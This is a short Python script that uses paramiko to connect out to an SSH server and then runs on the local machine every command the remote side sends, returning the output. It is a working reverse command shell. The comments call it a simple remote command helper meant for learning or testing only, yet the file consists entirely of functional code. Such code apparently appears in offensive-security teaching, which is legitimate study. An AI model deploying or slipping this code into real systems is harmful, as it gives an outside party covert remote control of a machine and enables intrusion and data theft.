import paramiko
import shlex
import subprocess

# Simple SSH remote command helper.
# Connects to an SSH server, opens a session, and executes commands
# received from the remote side. Intended for learning/testing only.

def ssh_command(ip, port, user, passwd, command):
    # Create SSH client and connect using provided credentials.
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    # Open a transport session for interactive command exchange.
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        # Notify the remote side that the client connected and send a tag.
        ssh_session.send(command.encode())
        # Print any welcome/initial message from remote (if sent).
        print(ssh_session.recv(1024).decode())
        while True:
            # Receive a command from the remote side (up to 1024 bytes).
            command = ssh_session.recv(1024)
            if not command:
                break
            try:
                cmd = command.decode().strip()
                # 'exit' terminates the session from the remote side.
                if cmd == 'exit':
                    client.close()
                    break
                # Run the received command locally and send back output.
                # We avoid shell=True and split the command safely.
                cmd_output = subprocess.check_output(shlex.split(cmd))
                # Send raw command output bytes; send a small OK message if none.
                ssh_session.send(cmd_output or b'okay')
            except Exception as e:
                # Return the exception text to the remote for debugging.
                ssh_session.send(str(e).encode())
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    
    ip = input('Enter server IP: ')
    port_input = input('Enter port: ')
    port = int(port_input) if port_input else 22
    ssh_command(ip, port, user, password, 'ClientConnected')